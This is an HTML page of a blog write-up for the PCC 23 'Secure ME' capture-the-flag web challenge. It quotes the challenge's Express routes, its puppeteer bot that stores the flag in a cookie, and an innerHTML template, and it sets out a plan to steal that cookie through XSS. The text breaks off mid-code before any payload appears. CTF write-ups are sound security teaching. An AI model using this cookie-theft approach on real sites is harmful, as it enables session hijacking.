<!DOCTYPE html>
<html lang="en">
  <head prefix="og: https://ogp.me/ns#">
    <meta charset="utf-8" />
    <meta name="generator" content="gh:importantimport/urara" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <link rel="manifest" crossorigin="use-credentials" href="/manifest.webmanifest" />
    <link rel="alternate" type="application/feed+json" href="/feed.json" />
    <link rel="alternate" type="application/atom+xml" href="/atom.xml" />
    <link rel="sitemap" type="application/xml" href="/sitemap.xml" />
    <meta http-equiv="content-security-policy" content="style-src 'self' 'unsafe-inline' https://giscus.app">
		<link href="../../../_app/immutable/assets/0.4781e3d8.css" rel="stylesheet">
		<link rel="modulepreload" href="../../../_app/immutable/entry/start.9390d2e8.js">
		<link rel="modulepreload" href="../../../_app/immutable/chunks/index.725d15e1.js">
		<link rel="modulepreload" href="../../../_app/immutable/chunks/singletons.6130ee79.js">
		<link rel="modulepreload" href="../../../_app/immutable/chunks/index.f6403797.js">
		<link rel="modulepreload" href="../../../_app/immutable/entry/app.4e0b84b7.js">
		<link rel="modulepreload" href="../../../_app/immutable/chunks/preload-helper.41c905a7.js">
		<link rel="modulepreload" href="../../../_app/immutable/nodes/0.c7f340eb.js">
		<link rel="modulepreload" href="../../../_app/immutable/chunks/posts.7eeb28a4.js">
		<link rel="modulepreload" href="../../../_app/immutable/chunks/posts.d89605eb.js">
		<link rel="modulepreload" href="../../../_app/immutable/chunks/icon.fa06396a.js">
		<link rel="modulepreload" href="../../../_app/immutable/chunks/title.ff9679dd.js">
		<link rel="modulepreload" href="../../../_app/immutable/nodes/7.3d46df0f.js">
		<link rel="modulepreload" href="../../../_app/immutable/chunks/post_layout.b6bd0bbf.js">
		<link rel="modulepreload" href="../../../_app/immutable/chunks/post_card.004e8740.js">
		<link rel="modulepreload" href="../../../_app/immutable/chunks/footer.a8ea1951.js"><title>Writeups for Web challenges from PCC 23 | ./khatta.sh | کھاتا</title><!-- HEAD_svelte-1592q3p_START --><link rel="me" href="https://kongwoo.icu/@seviche"><!-- HEAD_svelte-1592q3p_END --><!-- HEAD_svelte-1kxdj3d_START --><link rel="shortcut icon" href="https://blog.shameerkashif.me/favicon.png" sizes="48x48" type="image/png"><link rel="apple-touch-icon" href="https://blog.shameerkashif.me/assets/any@180.png" sizes="180x180" type="image/png"><link rel="icon" href="https://blog.shameerkashif.me/assets/any@192.png" sizes="192x192" type="image/png"><!-- HEAD_svelte-1kxdj3d_END --><!-- HEAD_svelte-1g590ms_START --><meta name="theme-color"><!-- HEAD_svelte-1g590ms_END --><!-- HEAD_svelte-abrfj_START --><meta name="author" content="@hash3liZer"><link rel="canonical" href="https://blog.shameerkashif.me/blog/2023/pcc-23-web-challenge-writeups">
    
    <meta name="keywords" content="pcc23">
    <meta name="description" content="These are the writeups for web challenges from PCC 23 held at Air University Islamabad"><!-- HTML_TAG_START --><link rel="me" href="https://github.com/hash3liZer" /><!-- HTML_TAG_END --><!-- HTML_TAG_START --><script async src="https://www.googletagmanager.com/gtag/js?id=G-ZZRLH1SYB9"></script><script>window.dataLayer = window.dataLayer || [];function gtag(){dataLayer.push(arguments);}gtag("js", new Date());gtag("config", "G-ZZRLH1SYB9");</script><!-- HTML_TAG_END --><!-- HEAD_svelte-abrfj_END --><!-- HEAD_svelte-4dky5b_START --><meta property="og:site_name" content="./khatta.sh | کھاتا"><meta property="og:locale" content="en"><meta property="og:type" content="article">
    <meta property="og:title" content="Writeups for Web challenges from PCC 23">
    <meta property="og:description" content="These are the writeups for web challenges from PCC 23 held at Air University Islamabad">
    <meta property="og:image" content="https://github.com/hash3liZer/khatta/assets/29171692/661f1693-25ee-4ea3-8599-635e7b73cb6e">
      <meta name="twitter:card" content="summary_large_image">
    <meta property="article:tag" content="pcc23">
    <meta property="og:url" content="https://blog.shameerkashif.me/blog/2023/pcc-23-web-challenge-writeups">
    <meta property="article:author" content="@hash3liZer">
    <meta property="article:published_time" content="2023-12-22T00:00:00.000Z">
    <meta property="article:modified_time" content="2024-09-29T20:20:13.427Z"><!-- HEAD_svelte-4dky5b_END -->
  </head>

  <body itemscope itemtype="https://schema.org/WebPage">
    










<header id="header" class="fixed z-50 w-screen transition-all duration-500 ease-in-out border-b-2 border-transparent max-h-[4.125rem] false"><div class="navbar"><div class="navbar-start">

<div class="dropdown lg:hidden"><label for="navbar-dropdown" tabindex="0" class="btn btn-square btn-ghost"><span class="i-heroicons-outline-menu-alt-1"></span></label>
  <ul id="navbar-dropdown" tabindex="0" class="menu menu-compact dropdown-content bg-base-100 text-base-content shadow-lg rounded-box min-w-max max-w-52 p-2"><li><a href="/resume">About Me</a>
        </li><li><a href="https://shameerkashif.me">Who@mi ➡️</a>
        </li></ul></div>
<div class="swap order-last hidden lg:inline-grid"><button class="swap-on btn btn-ghost text-base font-normal normal-case transition-all duration-200 hidden"></button>
  <ul class="swap-off menu menu-horizontal p-0"><li><a class="!rounded-btn" href="/resume">About Me</a>
        </li><li><a class="!rounded-btn" href="https://shameerkashif.me">Who@mi ➡️</a>
        </li></ul></div>
        <a href="/" class="btn btn-ghost normal-case text-lg">./khatta.sh | کھاتا</a></div>
      <div class="navbar-end"><button aria-label="search" tabindex="0" class="btn btn-square btn-ghost"><span class="i-heroicons-outline-search"></span></button>
        <div id="change-theme" class="dropdown dropdown-end">
          
          <div tabindex="0" class="btn btn-square btn-ghost"><span class="i-heroicons-outline-color-swatch"></span></div>
          
          
          <ul tabindex="0" class="flex flex-nowrap shadow-2xl menu dropdown-content bg-base-100 text-base-content rounded-box w-52 p-2 gap-2 overflow-y-auto max-h-[21.5rem]"><button data-theme="lofi" class="btn btn-ghost w-full hover:bg-primary group rounded-lg flex bg-base-100 p-2 transition-all"><p class="flex-1 text-left text-base-content group-hover:text-primary-content transition-color">Light</p>
                <div class="flex-none m-auto flex gap-1"><div class="bg-primary w-2 h-4 rounded"></div>
                  <div class="bg-secondary w-2 h-4 rounded"></div>
                  <div class="bg-accent w-2 h-4 rounded"></div>
                  <div class="bg-neutral w-2 h-4 rounded"></div></div>
              </button><button data-theme="dracula" class="btn btn-ghost w-full hover:bg-primary group rounded-lg flex bg-base-100 p-2 transition-all"><p class="flex-1 text-left text-base-content group-hover:text-primary-content transition-color">Dracula</p>
                <div class="flex-none m-auto flex gap-1"><div class="bg-primary w-2 h-4 rounded"></div>
                  <div class="bg-secondary w-2 h-4 rounded"></div>
                  <div class="bg-accent w-2 h-4 rounded"></div>
                  <div class="bg-neutral w-2 h-4 rounded"></div></div>
              </button><button data-theme="coffee" class="btn btn-ghost w-full hover:bg-primary group rounded-lg flex bg-base-100 p-2 transition-all"><p class="flex-1 text-left text-base-content group-hover:text-primary-content transition-color">Coffee</p>
                <div class="flex-none m-auto flex gap-1"><div class="bg-primary w-2 h-4 rounded"></div>
                  <div class="bg-secondary w-2 h-4 rounded"></div>
                  <div class="bg-accent w-2 h-4 rounded"></div>
                  <div class="bg-neutral w-2 h-4 rounded"></div></div>
              </button><button data-theme="cupcake" class="btn btn-ghost w-full hover:bg-primary group rounded-lg flex bg-base-100 p-2 transition-all"><p class="flex-1 text-left text-base-content group-hover:text-primary-content transition-color">Cupcake</p>
                <div class="flex-none m-auto flex gap-1"><div class="bg-primary w-2 h-4 rounded"></div>
                  <div class="bg-secondary w-2 h-4 rounded"></div>
                  <div class="bg-accent w-2 h-4 rounded"></div>
                  <div class="bg-neutral w-2 h-4 rounded"></div></div>
              </button><button data-theme="valentine" class="btn btn-ghost w-full hover:bg-primary group rounded-lg flex bg-base-100 p-2 transition-all"><p class="flex-1 text-left text-base-content group-hover:text-primary-content transition-color">Valentine</p>
                <div class="flex-none m-auto flex gap-1"><div class="bg-primary w-2 h-4 rounded"></div>
                  <div class="bg-secondary w-2 h-4 rounded"></div>
                  <div class="bg-accent w-2 h-4 rounded"></div>
                  <div class="bg-neutral w-2 h-4 rounded"></div></div>
              </button><button data-theme="aqua" class="btn btn-ghost w-full hover:bg-primary group rounded-lg flex bg-base-100 p-2 transition-all"><p class="flex-1 text-left text-base-content group-hover:text-primary-content transition-color">Aqua</p>
                <div class="flex-none m-auto flex gap-1"><div class="bg-primary w-2 h-4 rounded"></div>
                  <div class="bg-secondary w-2 h-4 rounded"></div>
                  <div class="bg-accent w-2 h-4 rounded"></div>
                  <div class="bg-neutral w-2 h-4 rounded"></div></div>
              </button><button data-theme="synthwave" class="btn btn-ghost w-full hover:bg-primary group rounded-lg flex bg-base-100 p-2 transition-all"><p class="flex-1 text-left text-base-content group-hover:text-primary-content transition-color">Synthwave</p>
                <div class="flex-none m-auto flex gap-1"><div class="bg-primary w-2 h-4 rounded"></div>
                  <div class="bg-secondary w-2 h-4 rounded"></div>
                  <div class="bg-accent w-2 h-4 rounded"></div>
                  <div class="bg-neutral w-2 h-4 rounded"></div></div>
              </button><button data-theme="night" class="btn btn-ghost w-full hover:bg-primary group rounded-lg flex bg-base-100 p-2 transition-all"><p class="flex-1 text-left text-base-content group-hover:text-primary-content transition-color">Night</p>
                <div class="flex-none m-auto flex gap-1"><div class="bg-primary w-2 h-4 rounded"></div>
                  <div class="bg-secondary w-2 h-4 rounded"></div>
                  <div class="bg-accent w-2 h-4 rounded"></div>
                  <div class="bg-neutral w-2 h-4 rounded"></div></div>
              </button><button data-theme="garden" class="btn btn-ghost w-full hover:bg-primary group rounded-lg flex bg-base-100 p-2 transition-all"><p class="flex-1 text-left text-base-content group-hover:text-primary-content transition-color">Garden</p>
                <div class="flex-none m-auto flex gap-1"><div class="bg-primary w-2 h-4 rounded"></div>
                  <div class="bg-secondary w-2 h-4 rounded"></div>
                  <div class="bg-accent w-2 h-4 rounded"></div>
                  <div class="bg-neutral w-2 h-4 rounded"></div></div>
              </button><button data-theme="lemonade" class="btn btn-ghost w-full hover:bg-primary group rounded-lg flex bg-base-100 p-2 transition-all"><p class="flex-1 text-left text-base-content group-hover:text-primary-content transition-color">Lemonade</p>
                <div class="flex-none m-auto flex gap-1"><div class="bg-primary w-2 h-4 rounded"></div>
                  <div class="bg-secondary w-2 h-4 rounded"></div>
                  <div class="bg-accent w-2 h-4 rounded"></div>
                  <div class="bg-neutral w-2 h-4 rounded"></div></div>
              </button><button data-theme="cmyk" class="btn btn-ghost w-full hover:bg-primary group rounded-lg flex bg-base-100 p-2 transition-all"><p class="flex-1 text-left text-base-content group-hover:text-primary-content transition-color">CMYK</p>
                <div class="flex-none m-auto flex gap-1"><div class="bg-primary w-2 h-4 rounded"></div>
                  <div class="bg-secondary w-2 h-4 rounded"></div>
                  <div class="bg-accent w-2 h-4 rounded"></div>
                  <div class="bg-neutral w-2 h-4 rounded"></div></div>
              </button><button data-theme="retro" class="btn btn-ghost w-full hover:bg-primary group rounded-lg flex bg-base-100 p-2 transition-all"><p class="flex-1 text-left text-base-content group-hover:text-primary-content transition-color">Retro</p>
                <div class="flex-none m-auto flex gap-1"><div class="bg-primary w-2 h-4 rounded"></div>
                  <div class="bg-secondary w-2 h-4 rounded"></div>
                  <div class="bg-accent w-2 h-4 rounded"></div>
                  <div class="bg-neutral w-2 h-4 rounded"></div></div>
              </button><button data-theme="black" class="btn btn-ghost w-full hover:bg-primary group rounded-lg flex bg-base-100 p-2 transition-all"><p class="flex-1 text-left text-base-content group-hover:text-primary-content transition-color">Black</p>
                <div class="flex-none m-auto flex gap-1"><div class="bg-primary w-2 h-4 rounded"></div>
                  <div class="bg-secondary w-2 h-4 rounded"></div>
                  <div class="bg-accent w-2 h-4 rounded"></div>
                  <div class="bg-neutral w-2 h-4 rounded"></div></div>
              </button></ul></div></div></div></header>

<button id="totop" aria-label="scroll to top" class="fixed grid group btn btn-circle btn-lg border-none backdrop-blur bottom-6 right-6 z-50 duration-500 ease-in-out btn-ghost bg-base-100/30 md:bg-base-200/30 translate-y-24"><div class="radial-progress text-accent transition-all duration-500 ease-in-out group-hover:text-accent-focus col-start-1 row-start-1" style="--size:4rem; --thickness: 0.25rem; --value:undefined;"></div>
  <div class="border-4 border-base-content/10 group-hover:border-transparent col-start-1 row-start-1 rounded-full w-full h-full p-4 grid duration-500 ease-in-out"><span class="i-heroicons-solid-chevron-up !w-6 !h-6"></span></div></button>

<div class="bg-base-100 md:bg-base-200 min-h-screen pt-16 md:pb-8 lg:pb-16">



<div class="flex flex-col flex-nowrap justify-center xl:flex-row xl:flex-wrap"><div class="flex-1 w-full order-first ease-out transform mx-auto xl:mr-0 xl:ml-0"></div>
  <div class="flex-1 w-full xl:order-last ease-out transform mx-auto xl:ml-0 xl:mr-0"></div>
  <div class="flex-none w-full max-w-screen-md mx-auto xl:mx-0"><article itemscope itemtype="https://schema.org/BlogPosting" itemprop="blogPost" class="h-entry card bg-base-100 rounded-none md:rounded-box md:shadow-lg md:shadow-grey-10 overflow-hidden z-10 md:mb-8 lg:mb-16"><div id="bridgy" class="hidden"><a href="https://brid.gy/publish/mastodon">mastodon</a></div>
  
  
  <div class="card-body gap-0 "><div class="flex flex-col gap-2"><figure class="md:order-last rounded-lg mb-4 flex-col gap-2 -mt-8 md:mt-0'
          }"><img src="https://github.com/hash3liZer/khatta/assets/29171692/661f1693-25ee-4ea3-8599-635e7b73cb6e" alt="https://github.com/hash3liZer/khatta/assets/29171692/661f1693-25ee-4ea3-8599-635e7b73cb6e" class="u-featured" loading="lazy" decoding="async"></figure>
      <div class="flex font-semibold gap-1.5"><a rel="author" class="opacity-75 hover:opacity-100 hover:text-primary duration-500 ease-in-out p-author h-card" href="https://blog.shameerkashif.me">@hash3liZer</a>
  <span class="opacity-50">/</span>
  <a href="/blog/2023/pcc-23-web-challenge-writeups" class="u-url u-uid swap group/time"><time class="group-hover/time:opacity-0 font-semibold opacity-75 duration-500 ease-in-out mr-auto dt-published" datetime="2023-12-22T00:00:00.000Z" itemprop="datePublished">Fri, Dec 22, 2023</time>
    <time class="opacity-0 group-hover/time:opacity-100 font-semibold text-primary duration-500 ease-in-out mr-auto dt-updated" datetime="2024-09-29T20:20:13.427Z" itemprop="dateModified">Sun, Sep 29, 2024</time></a></div>
      <h1 itemprop="name headline" class="card-title text-2xl mb-8 p-name">Writeups for Web challenges from PCC 23</h1>
      <p itemprop="description" class="p-summary mb-auto hidden">These are the writeups for web challenges from PCC 23 held at Air University Islamabad</p></div>
    <main itemprop="articleBody" class="urara-prose prose e-content"><h1 id="qualifiers"><a href="#qualifiers">Qualifiers</a></h1>
<h3 id="secure-me"><a href="#secure-me">Secure ME</a></h3>
<p>The challenge had the following instruction and one attachment: </p>
<blockquote><p>It’s just an application to secure your profile. What can possibly go wrong</p></blockquote>
<p>On the first review, the website seems to simply return a <code>Resolution ID</code> when details are submitted. There’s nothing more here. </p>
<p><img src="https://github.com/hash3liZer/khatta/assets/29171692/52943339-b80e-4e25-b7f3-cec5e264f91c" alt="image" class="rounded-lg my-2" loading="lazy" decoding="async"></p>
<p>So, lets review the attachment now. We find that we actually have 3 endpoints: </p>
<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">/save</span></div><div class='line'><span style="color: undefined">/:resolution</span></div><div class='line'><span style="color: undefined">/view/:resolution</span></div></code></div></pre><!-- HTML_TAG_END -->
<p>Lets check the resolution endpoint. The resolution page is rendered with our provided values. So, lets view the url. </p>
<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" javascript="true"><div class="language-id">javascript</div><div class='code-container'><code><div class='line'><span style="color: #EEFFFF">app</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">get</span><span style="color: #EEFFFF">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">/:resolution</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">req</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> res</span><span style="color: #89DDFF">)</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">=&gt;</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #F07178">  </span><span style="color: #C792EA">const</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">resolution</span><span style="color: #F07178"> </span><span style="color: #89DDFF">=</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">resolutions</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">get</span><span style="color: #F07178">(</span><span style="color: #EEFFFF">req</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">params</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">resolution</span><span style="color: #F07178">)</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">  </span><span style="color: #89DDFF">if</span><span style="color: #F07178"> (</span><span style="color: #89DDFF">!</span><span style="color: #EEFFFF">resolution</span><span style="color: #F07178">) </span><span style="color: #89DDFF">return</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">res</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">status</span><span style="color: #F07178">(</span><span style="color: #F78C6C">404</span><span style="color: #F07178">)</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">send</span><span style="color: #F07178">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">not found</span><span style="color: #89DDFF">"</span><span style="color: #F07178">)</span><span style="color: #89DDFF">;</span></div><div class='line'></div><div class='line'><span style="color: #F07178">  </span><span style="color: #EEFFFF">res</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">render</span><span style="color: #F07178">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">resolutions</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">,</span><span style="color: #F07178"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #F07178">    id</span><span style="color: #89DDFF">:</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">req</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">params</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">resolution</span><span style="color: #89DDFF">,</span></div><div class='line'><span style="color: #F07178">    name</span><span style="color: #89DDFF">:</span><span style="color: #F07178"> </span><span style="color: #82AAFF">encodeURIComponent</span><span style="color: #F07178">(</span><span style="color: #EEFFFF">resolution</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">name</span><span style="color: #F07178">)</span><span style="color: #89DDFF">,</span></div><div class='line'><span style="color: #F07178">    description</span><span style="color: #89DDFF">:</span><span style="color: #F07178"> </span><span style="color: #82AAFF">encodeURIComponent</span><span style="color: #F07178">(</span><span style="color: #EEFFFF">resolution</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">description</span><span style="color: #F07178">)</span><span style="color: #89DDFF">,</span></div><div class='line'><span style="color: #F07178">  </span><span style="color: #89DDFF">&#125;</span><span style="color: #F07178">)</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #89DDFF">&#125;</span><span style="color: #EEFFFF">)</span><span style="color: #89DDFF">;</span></div></code></div></pre><!-- HTML_TAG_END -->
<p><img src="https://github.com/hash3liZer/khatta/assets/29171692/2269cc03-ac04-4e80-a1f7-fe2e5ad7ebc3" alt="image" class="rounded-lg my-2" loading="lazy" decoding="async"></p>
<p>The page provides the link to <code>/view/:resolution</code> where the resolution page is visited through puppeteer. So, jump back to the flag part. The flag is attached in the cookie on the resolution page: </p>
<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" javascript="true"><div class="language-id">javascript</div><div class='code-container'><code><div class='line'><span style="color: #EEFFFF">ctx </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">await</span><span style="color: #EEFFFF"> (</span><span style="color: #89DDFF">await</span><span style="color: #EEFFFF"> browser)</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">createIncognitoBrowserContext</span><span style="color: #EEFFFF">()</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #C792EA">const</span><span style="color: #EEFFFF"> visit </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">async</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">browser</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> resolution</span><span style="color: #89DDFF">)</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">=&gt;</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #F07178">  </span><span style="color: #C792EA">const</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">page</span><span style="color: #F07178"> </span><span style="color: #89DDFF">=</span><span style="color: #F07178"> </span><span style="color: #89DDFF">await</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">browser</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">newPage</span><span style="color: #F07178">()</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">  </span><span style="color: #89DDFF">await</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">page</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">goto</span><span style="color: #F07178">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">http://localhost:8000</span><span style="color: #89DDFF">"</span><span style="color: #F07178">)</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">  </span><span style="color: #89DDFF">await</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">page</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">setCookie</span><span style="color: #F07178">(</span><span style="color: #89DDFF">&#123;</span><span style="color: #F07178"> name</span><span style="color: #89DDFF">:</span><span style="color: #F07178"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">pcc</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">,</span><span style="color: #F07178"> value</span><span style="color: #89DDFF">:</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">process</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">env</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">FLAG</span><span style="color: #F07178"> </span><span style="color: #89DDFF">&#125;</span><span style="color: #F07178">)</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">  </span><span style="color: #89DDFF">await</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">page</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">goto</span><span style="color: #F07178">(</span><span style="color: #89DDFF">&#96;</span><span style="color: #C3E88D">http://localhost:8000/</span><span style="color: #89DDFF">$&#123;</span><span style="color: #EEFFFF">resolution</span><span style="color: #89DDFF">&#125;&#96;</span><span style="color: #F07178">)</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">  </span><span style="color: #89DDFF">await</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">page</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">waitForNetworkIdle</span><span style="color: #F07178">(</span><span style="color: #89DDFF">&#123;</span><span style="color: #F07178"> timeout</span><span style="color: #89DDFF">:</span><span style="color: #F07178"> </span><span style="color: #F78C6C">6000</span><span style="color: #F07178"> </span><span style="color: #89DDFF">&#125;</span><span style="color: #F07178">)</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">  </span><span style="color: #89DDFF">await</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">page</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">close</span><span style="color: #F07178">()</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #89DDFF">&#125;;</span></div></code></div></pre><!-- HTML_TAG_END -->
<p>So, if we could get the <code>XSS</code> on resolution page. We can capture the flag from cookie. Lets revisit our resolution page code: </p>
<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" html="true"><div class="language-id">html</div><div class='code-container'><code><div class='line'><span style="color: #89DDFF">&lt;</span><span style="color: #F07178">body</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&lt;</span><span style="color: #F07178">div</span><span style="color: #89DDFF"> </span><span style="color: #C792EA">class</span><span style="color: #89DDFF">=</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">container</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&lt;</span><span style="color: #F07178">div</span><span style="color: #89DDFF"> </span><span style="color: #C792EA">class</span><span style="color: #89DDFF">=</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">alert alert-success p-4</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF"> </span><span style="color: #C792EA">id</span><span style="color: #89DDFF">=</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">alert</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF"> </span><span style="color: #C792EA">role</span><span style="color: #89DDFF">=</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">alert</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">&lt;</span><span style="color: #F07178">h4</span><span style="color: #89DDFF"> </span><span style="color: #C792EA">class</span><span style="color: #89DDFF">=</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">alert-heading</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">&gt;</span><span style="color: #EEFFFF">Well done!</span><span style="color: #89DDFF">&lt;/</span><span style="color: #F07178">h4</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">&lt;</span><span style="color: #F07178">p</span><span style="color: #89DDFF"> </span><span style="color: #C792EA">id</span><span style="color: #89DDFF">=</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">name</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">&gt;&lt;/</span><span style="color: #F07178">p</span><span style="color: #89DDFF">&gt;&lt;</span><span style="color: #F07178">hr</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">&lt;</span><span style="color: #F07178">p</span><span style="color: #89DDFF"> </span><span style="color: #C792EA">id</span><span style="color: #89DDFF">=</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">resolution</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF"> </span><span style="color: #C792EA">class</span><span style="color: #89DDFF">=</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">mb-0</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">&gt;&lt;/</span><span style="color: #F07178">p</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&lt;/</span><span style="color: #F07178">div</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&lt;/</span><span style="color: #F07178">div</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #89DDFF">    &lt;</span><span style="color: #F07178">script</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #C792EA">let</span><span style="color: #EEFFFF"> name </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> document</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">getElementById</span><span style="color: #EEFFFF">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">name</span><span style="color: #89DDFF">"</span><span style="color: #EEFFFF">)</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #C792EA">let</span><span style="color: #EEFFFF"> res   </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> document</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">getElementById</span><span style="color: #EEFFFF">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">resolution</span><span style="color: #89DDFF">"</span><span style="color: #EEFFFF">)</span></div><div class='line'><span style="color: #EEFFFF">        name</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">innerHTML </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> DOMPurify</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">sanitize</span><span style="color: #EEFFFF">(</span><span style="color: #82AAFF">decodeURIComponent</span><span style="color: #EEFFFF">(</span><span style="color: #89DDFF">&#96;</span><span style="color: #C3E88D">Shameer</span><span style="color: #89DDFF">&#96;</span><span style="color: #EEFFFF">))</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #C792EA">class</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">Maker</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">            </span><span style="color: #F07178">#is_safe</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #EEFFFF">            </span><span style="color: #C792EA">constructor</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">is_safe </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #FF9CAC">true</span><span style="color: #89DDFF">)</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;this.</span><span style="color: #EEFFFF">#is_safe</span><span style="color: #F07178"> </span><span style="color: #89DDFF">=</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">is_safe</span><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #EEFFFF">            </span><span style="color: #C792EA">get</span><span style="color: #EEFFFF"> </span><span style="color: #F07178">is_safe</span><span style="color: #89DDFF">()</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span><span style="color: #89DDFF">return</span><span style="color: #F07178"> </span><span style="color: #89DDFF">this.</span><span style="color: #EEFFFF">#is_safe</span><span style="color: #89DDFF">;&#125;</span></div><div class='line'><span style="color: 